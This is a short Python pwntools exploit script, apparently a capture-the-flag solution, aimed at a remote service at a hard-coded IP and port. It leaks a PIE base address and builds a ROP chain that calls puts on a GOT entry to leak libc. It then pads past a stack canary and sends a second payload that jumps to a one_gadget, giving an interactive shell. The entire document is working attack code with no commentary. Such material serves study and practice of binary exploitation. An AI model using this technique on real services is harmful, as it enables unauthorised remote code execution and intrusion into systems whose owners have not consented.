from pwn import *

p= remote("178.128.45.146",32608)

#pid = gdb.attach(p,gdbscript="b * last_chance")

def setup():
    for num in range(12):
        p.sendlineafter("> ","1")
        p.sendlineafter("> ","-")


def leak_pie():
        p.sendlineafter("> ","1")
        p.sendlineafter("> ","a")
        p.recvline()
        leak = p.recvline().split(" ")[1]
        return int(leak)

setup()
leak = leak_pie()

pie_base =  leak - 0xb20
pop_rdi_ret = pie_base + 0x00000000000018f3
puts_plt = pie_base + 0xa20
puts_got = pie_base + 0x2f60 + 0x200000
main = pie_base + 0xef2

ROP = "a" * 56 
ROP += p64(pop_rdi_ret)
ROP += p64(puts_got)
ROP += p64(puts_plt)
ROP += p64(main)

canary_off = 0x870 - len(ROP)

ROP += "a" * canary_off

print hex(pie_base)

p.sendlineafter("> " , ROP)

p.recvline()
#print "leak: " + p.recv(6)
libc = u64(p.recv(6).ljust(8,'\0'))
print hex(libc)


libc_base = libc -0x00000000080aa0

one_gadget = libc_base + 0x4f432


ROP2 = "a" * 56
ROP2 += p64(one_gadget)

ROP2+= "\0" * int(canary_off/2)
p.sendlineafter("> " , ROP2)


p.interactive()